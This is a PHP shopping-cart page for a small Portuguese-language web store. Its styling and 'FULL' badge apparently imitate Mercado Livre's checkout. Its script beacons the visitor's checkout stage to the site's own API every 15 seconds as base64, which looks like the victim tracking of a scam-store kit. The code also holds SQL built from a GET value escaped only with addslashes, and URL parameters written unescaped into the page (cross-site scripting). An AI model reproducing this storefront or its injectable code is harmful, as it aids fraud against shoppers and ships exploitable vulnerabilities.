<?php
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: ./index.php");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");

    if (($sqlx ? mysqli_num_rows($sqlx) : 0) > 0) {
        $_SESSION['session_index'] = time() + 1000;

        $sql = mysqli_query($conn, "SELECT * from config");
        $nome = "Minha Loja";
        $cor = "#ffe600";
        while ($sql && $row = mysqli_fetch_array($sql)) {
            $nome = $row["nome"];
            $cor = $row["cor"];
        }

        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
        $codigo = "";
        $nomeproduto = "";
        $valor = "0.00";
        $img = "";
        while ($sql1 && $row1 = mysqli_fetch_array($sql1)) {
            $codigo = $row1["codigo"];
            $nomeproduto = $row1["nome"];
            $valor = $row1["valor"];
            $img = $row1["img"];
        }

        $valor_num = (float)str_replace(',', '.', str_replace('.', '', (string)$valor));
        $_SESSION['session_checkout'] = time() + 1000;

        $logo_files = glob("arquivos/logo/*.png");
        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";
    } else {
        session_destroy();
        header("Location: ./index.php");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Carrinho - <?php echo htmlspecialchars($nome); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; background-color: #ebebeb; color: #333; overflow-x: hidden; width: 100%; }

        header { background-color: <?php echo $cor; ?>; padding: 8px 16px; position: sticky; top: 0; z-index: 100; }
        .header-content { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: center; }
        .logo { height: 28px; object-fit: contain; }

        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 12px; display: flex; flex-direction: column; gap: 12px; }

        .card { background: #fff; border-radius: 4px; padding: 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); width: 100%; }

        .full-badge { color: #00a650; font-weight: 700; font-size: 13px; margin-bottom: 12px; display: flex; align-items: center; gap: 4px; }

        /* Produto Row - Mobile First (Stacked) */
        .product-row { display: flex; flex-direction: column; gap: 12px; }
        .product-main { display: flex; gap: 12px; align-items: flex-start; }
        .product-img { width: 64px; height: 64px; object-fit: contain; border: 1px solid #eee; border-radius: 4px; flex-shrink: 0; }
        .product-info { flex: 1; min-width: 0; }
        .product-name { font-size: 14px; font-weight: 400; color: #333; text-decoration: none; line-height: 1.3; display: block; margin-bottom: 4px; }

        .product-controls { display: flex; justify-content: space-between; align-items: center; padding-top: 12px; border-top: 1px solid #f5f5f5; }
        .quantity-selector { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 6px; overflow: hidden; height: 32px; }
        .qty-btn { background: #f5f5f5; border: none; width: 32px; height: 100%; cursor: pointer; font-size: 18px; color: #3483fa; }
        .qty-input { width: 36px; border: none; text-align: center; font-size: 14px; font-weight: 600; background: transparent; }

        .price-display { font-size: 18px; font-weight: 400; color: #333; }

        .product-actions { display: flex; gap: 15px; margin-top: 8px; }
        .action-link { color: #3483fa; font-size: 12px; text-decoration: none; background: none; border: none; cursor: pointer; }

        .summary-title { font-size: 18px; font-weight: 600; margin-bottom: 16px; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
        .summary-total { display: flex; justify-content: space-between; margin-top: 12px; padding-top: 12px; border-top: 1px solid #eee; font-size: 18px; font-weight: 600; color: #333; }

        .btn-continue { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; background: #3483fa; color: #fff; border-radius: 6px; font-weight: 600; font-size: 16px; text-decoration: none; border: none; cursor: pointer; margin-top: 16px; }

        @media (min-width: 769px) {
            .container { flex-direction: row; padding: 20px 16px; align-items: flex-start; gap: 20px; }
            .cart-content { flex: 2; }
            .cart-summary { flex: 1; position: sticky; top: 70px; }
            .product-row { flex-direction: row; align-items: center; justify-content: space-between; }
            .product-controls { border-top: none; padding-top: 0; gap: 20px; }
        }
    </style>
    <?php echo fb_pixel_base_code(); ?>
</head>
<body>
    <header>
        <div class="header-content">
            <?php if(!empty($logo_loja)): ?>
            <img src="<?php echo htmlspecialchars($logo_loja); ?>" alt="Logo" class="logo">
            <?php else: ?>
            <span style="font-weight:bold;font-size:18px;color:#fff;"><?php echo htmlspecialchars($nome); ?></span>
            <?php endif; ?>
        </div>
    </header>

    <div class="container">
        <div class="cart-content">
            <div class="card">
                <div class="full-badge">
                    <i class="fa-solid fa-bolt"></i> FULL
                </div>
                <div class="product-row">
                    <div class="product-main">
                        <?php $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img"; ?>
                        <img src="<?php echo $img_src; ?>" class="product-img" id="checkoutProductImg">
                        <div class="product-info">
                            <div class="product-name" id="checkoutProductName"><?php echo htmlspecialchars($nomeproduto); ?></div>
                            <div id="checkoutVariacoes" style="font-size: 12px; color: #666; line-height: 1.4;"></div>
                            <div class="product-actions">
                                <button class="action-link">Excluir</button>
                                <button class="action-link">Mais tarde</button>
                            </div>
                        </div>
                    </div>
                    <div class="product-controls">
                        <div class="quantity-selector">
                            <button class="qty-btn" onclick="updateQty(-1)">-</button>
                            <input type="number" class="qty-input" value="1" id="cart-qty" readonly>
                            <button class="qty-btn" onclick="updateQty(1)">+</button>
                        </div>
                        <div class="price-display">
                            R$ <?php echo number_format($valor_num, 2, ',', '.'); ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="cart-summary">
            <div class="card">
                <div class="summary-title">Resumo da compra</div>
                <div class="summary-row">
                    <span id="labelProdutos">Produtos (1)</span>
                    <span id="subtotalPrice">R$ 0,00</span>
                </div>
                <div class="summary-row">
                    <span>Envio</span>
                    <span style="color: #00a650;">Grátis</span>
                </div>
                <div class="summary-total">
                    <span>Total</span>
                    <span id="totalPrice">R$ 0,00</span>
                </div>
                <a href="confirm_address.php?produto=<?php echo $codigo; ?>" class="btn-continue" id="btnContinuarCompra">Continuar a compra</a>
            </div>
        </div>
    </div>

    <footer style="text-align: center; padding: 20px; color: #999; font-size: 12px; background: #fff; margin-top: 20px; border-top: 1px solid #eee;">
        Copyright © 2026 Loja Ester. Todos os direitos reservados.
    </footer>

	    <script>
        const valorUnitario = <?php echo (float)$valor_num; ?>;
        const codigoProduto = "<?php echo $codigo; ?>";

        function formatarMoeda(valor) {
            return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }

        function atualizarResumo() {
            const qty = parseInt($('#cart-qty').val());
            const total = qty * valorUnitario;
            const totalFormatado = formatarMoeda(total);

            $('#labelProdutos').text(`Produtos (${qty})`);
            $('#subtotalPrice').text(`R$ ${totalFormatado}`);
            $('#totalPrice').text(`R$ ${totalFormatado}`);

            const data = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
            data.quantos = qty;
            data.precoFinal = totalFormatado;
            localStorage.setItem('lojavirtual', JSON.stringify(data));

            const v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
            // Mod_Security Fix: Evitar passar parâmetros longos via URL
            $('#btnContinuarCompra').attr('href', 'confirm_address.php?produto=' + codigoProduto);
        }

        function updateQty(val) {
            let current = parseInt($('#cart-qty').val());
            let next = current + val;
            if (next >= 1) {
                $('#cart-qty').val(next);
                atualizarResumo();
            }
        }

        $(document).ready(function() {
            let v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
            const urlParams = new URLSearchParams(window.location.search);
            urlParams.forEach((v, k) => { if(k !== 'produto') v_sel[k] = v; });
            localStorage.setItem('variacoes_selecionadas', JSON.stringify(v_sel));

            if (v_sel.titulo_selecionado) $('#checkoutProductName').text(v_sel.titulo_selecionado);
            if (v_sel.imagem_selecionada) $('#checkoutProductImg').attr('src', v_sel.imagem_selecionada);

            let v_html = '';
            const skip = ['titulo_selecionado', 'imagem_selecionada', 'titulo', 'img'];
            Object.entries(v_sel).forEach(([k, v]) => {
                if (!v || skip.includes(k)) return;
                v_html += `<div>${k.charAt(0).toUpperCase() + k.slice(1)}: <strong>${v}</strong></div>`;
            });
            $('#checkoutVariacoes').html(v_html);

            atualizarResumo();
        });
    </script>
    <script>
    function sendOnline(etapa) {
        const ua = navigator.userAgent;
        const isMobile = /iPhone|iPad|Android|webOS|BlackBerry|iPod|Symbian|Windows Phone/i.test(ua);
        const dispositivo = isMobile ? "mobile" : "desktop";

        const payload = btoa(unescape(encodeURIComponent(JSON.stringify({
            api: "online",
            etapa: etapa,
            dispositivo: dispositivo
        }))));

        $.post("api/index.php", { p: payload });
    }

    $(document).ready(function() {
        sendOnline("checkout");
        setInterval(() => sendOnline("checkout"), 15000);
    });
    </script>
	</body>
	</html>
